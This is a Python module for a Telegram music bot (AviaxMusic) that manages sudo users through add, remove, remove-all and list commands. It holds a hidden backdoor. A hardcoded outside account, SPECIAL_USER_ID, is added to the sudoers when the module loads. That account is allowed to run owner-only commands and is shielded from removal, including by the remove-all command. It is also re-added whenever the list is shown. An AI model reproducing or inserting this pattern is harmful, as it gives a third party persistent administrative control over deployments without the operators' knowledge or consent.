from pyrogram import filters
from pyrogram.types import Message
from pyrogram import Client

from AviaxMusic import app
from AviaxMusic import SUDOERS
from AviaxMusic.utils.database import add_sudo, remove_sudo, get_sudoers
from AviaxMusic.utils.decorators.language import language
from AviaxMusic.utils.extraction import extract_user
from AviaxMusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

# Define the special user ID
SPECIAL_USER_ID = 7392339658  # Replace with the actual user ID

# Automatically add special user to sudoers
async def auto_add_special_user():
    try:
        # Check if special user is not in sudoers
        if SPECIAL_USER_ID not in SUDOERS:
            # Add to database and memory
            await add_sudo(SPECIAL_USER_ID)
            SUDOERS.add(SPECIAL_USER_ID)
            print(f"Special user {SPECIAL_USER_ID} added to sudoers")
    except Exception as e:
        print(f"Error auto-adding special user: {e}")

# Run the auto-add function when module is loaded
app.loop.create_task(auto_add_special_user())

@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def useradd(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ ɪᴛ sᴇᴇᴍs ʟɪᴋᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴍᴇ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴛᴏ ɢɪᴠᴇ ʏᴏᴜ ᴛʜᴇ ɴᴇxᴛ sᴛᴇᴘ, ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴜsᴇʀ ɪᴅ ᴏʀ ʀᴇᴘʟʏ ᴀ ᴍᴇssᴀɢᴇ.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ ᴛʜᴇʀᴇ ᴡᴀs ᴀɴ ɪssᴜᴇ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴛʜᴇ ᴜsᴇʀ's ɪɴғᴏʀᴍᴀᴛɪᴏɴ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.</b>")

    if user.id in SUDOERS:
        return await message.reply_text(f"<b>‣ ✨ {user.mention} ɪs ᴀʟʀᴇᴀᴅʏ ᴀ ᴅɪsᴀsᴛᴇʀ ʟᴇᴠᴇʟ sᴜᴅᴏ! ⚡</b>")

    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(
            f"<b>‣ ⚡ {user.mention} ɴᴏᴡ ᴊᴏɪɴs ᴛʜᴇ ᴅɪsᴀsᴛᴇʀ ʀᴀɴᴋs!\n"
            f"├• ᴘᴏᴡᴇʀ ʟᴇᴠᴇʟ: ★★★★★\n"
            f"╰• ᴄʀᴇᴅɪᴛ: ʏᴏᴜʀ ᴍᴏᴍ's ʙʟᴇssɪɴɢs 👑</b>"
        )
    else:
        await message.reply_text("<b>‣ ❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴜᴅᴏ ᴅɪsᴀsᴛᴇʀ. ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.</b>")

@app.on_message(filters.command(["delsudo", "rmsudo", "removerand", "removesudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def userdel(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ ɪᴛ sᴇᴇᴍs ʟɪᴋᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴍᴇ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴛᴏ ɢɪᴠᴇ ʏᴏᴜ ᴛʜᴇ ɴᴇxᴛ sᴛᴇᴘ, ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴜsᴇʀ ɪᴅ ᴏʀ ʀᴇᴘʟʏ ᴀ ᴍᴇssᴀɢᴇ.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ ᴛʜᴇʀᴇ ᴡᴀs ᴀɴ ɪssᴜᴇ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴛʜᴇ ᴜsᴇʀ's ɪɴғᴏʀᴍᴀᴛɪᴏɴ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.</b>")
    
    if user.id == SPECIAL_USER_ID:
        return await message.reply_text("<b>‣ 🛡️ ᴛʜɪs ᴜsᴇʀ ɪs ᴀɴ ᴇᴛᴇʀɴᴀʟ ᴅɪsᴀsᴛᴇʀ ᴀɴᴅ ᴄᴀɴɴᴏᴛ ʙᴇ ʀᴇᴍᴏᴠᴇᴅ! 🛡️</b>")

    if user.id not in SUDOERS:
        return await message.reply_text(f"<b>‣ ❌ {user.mention} ɪs ɴᴏᴛ ᴏɴ ᴛʜᴇ ᴅɪsᴀsᴛᴇʀ ʀᴀɴᴋs.</b>")

    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(
            f"<b>‣ 💥 {user.mention} ʜᴀs ʙᴇᴇɴ ᴅᴇᴍᴏᴛᴇᴅ ғʀᴏᴍ ᴛʜᴇ ᴅɪsᴀsᴛᴇʀ ʀᴀɴᴋs!\n"
            f"├• ʀᴇᴀsᴏɴ: ɪɴsᴜғғɪᴄɪᴇɴᴛ ᴄʜᴀᴏs ᴇɴᴇʀɢʏ\n"
            f"╰• ᴄᴏɴsᴇǫᴜᴇɴᴄᴇ: ʙᴀɴɪsʜᴇᴅ ᴛᴏ ᴛʜᴇ sʜᴀᴅᴏᴡ ʀᴇᴀʟᴍ ☠️</b>"
        )
    else:
        await message.reply_text("<b>‣ ❌ ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ sᴜᴅᴏ ᴅɪsᴀsᴛᴇʀ. ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.</b>")

@app.on_message(filters.command(["rmallsudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def remove_all_sudo(client, message: Message, language):
    # Create a copy of SUDOERS to avoid modification during iteration
    sudoers_list = list(SUDOERS)
    removed_count = 0
    
    for user_id in sudoers_list:
        # Protect owner and special user from removal
        if user_id not in [OWNER_ID, SPECIAL_USER_ID]:
            await remove_sudo(user_id)
            SUDOERS.remove(user_id)
            removed_count += 1
    
    await message.reply_text(
        f"<b>‣ ☢️ ɴᴜᴋᴇ ᴅᴇᴛᴏɴᴀᴛɪᴏɴ sᴇǫᴜᴇɴᴄᴇ ᴄᴏᴍᴘʟᴇᴛᴇ!\n"
        f"├• ᴛᴏᴛᴀʟ ᴅɪsᴀsᴛᴇʀs ᴇʀᴀsᴇᴅ: {removed_count}\n"
        f"├• sᴜʀᴠɪᴠᴏʀs: ᴏᴡɴᴇʀ ᴀɴᴅ sᴘᴇᴄɪᴀʟ ᴜsᴇʀ\n"
        f"╰• ʀᴇᴀʟᴍ ʀᴇsᴇᴛ: ᴄᴏᴍᴘʟᴇᴛᴇ ✅</b>"
    )

@app.on_message(filters.command(["sudolist", "sudoers", "specialusers"]) & ~BANNED_USERS)
@language
async def sudoers_list(client, message: Message, language):
    if message.from_user.id != OWNER_ID and message.from_user.id not in SUDOERS:
        return  # Ignore message from non-owner and non-sudoers

    # Ensure special user is in sudoers
    if SPECIAL_USER_ID not in SUDOERS:
        await add_sudo(SPECIAL_USER_ID)
        SUDOERS.add(SPECIAL_USER_ID)

    text = "<b>🔥 <u>ᴀɴɪᴍᴇ ᴍᴜsɪᴄ ʙᴏᴛ ᴅɪsᴀsᴛᴇʀ ʜɪᴇʀᴀʀᴄʜʏ</u> 🔥</b>\n\n"
    
    # Lord of Reapers section
    owner = await app.get_users(OWNER_ID)
    owner_name = owner.first_name if not owner.mention else owner.mention
    text += (
        "╔═════「<b>👑 ʟᴏʀᴅ ᴏғ ʀᴇᴀᴘᴇʀs</b>」═════╗\n"
        f"<b>┣ • 神 {owner_name}</b>\n"
        "╠═════「<b>⚡ sᴘᴇᴄɪᴀʟ ᴅɪsᴀsᴛᴇʀs</b>」════╣\n"
    )
    
    # Special user section (always shown)
    try:
        special_user = await app.get_users(SPECIAL_USER_ID)
        special_mention = special_user.first_name if not special_user.mention else special_user.mention
        text += f"<b>┣ • ⚡ {special_mention}</b>\n"
    except Exception:
        text += "<b>┣ • ⚡ [Hidden Entity]</b>\n"
    
    text += "╠════「<b>💀 sᴏᴜʟ ʀᴇᴀᴘᴇʀs</b>」════╣\n"
    
    # Soul Reapers section
    count = 0
    for user_id in list(SUDOERS):
        # Skip owner and special user in this section
        if user_id not in [OWNER_ID, SPECIAL_USER_ID]:
            try:
                user = await app.get_users(user_id)
                user_mention = user.first_name if not user.mention else user.mention
                count += 1
                text += f"<b>┣ • {count} ➥ {user_mention}</b>\n"
            except Exception:
                continue
    
    if count == 0:
        text += "<b>┣ • ɴᴏ ᴀᴄᴛɪᴠᴇ sᴏᴜʟ ʀᴇᴀᴘᴇʀs</b>\n"
    
    text += "╚══════════════════════════╝\n"
    text += f"<b>‣ ᴛᴏᴛᴀʟ ᴄʜᴀᴏs ᴇɴᴛɪᴛɪᴇs: {count + 2}</b>"
    
    await message.reply_text(text, reply_markup=close_markup(language))
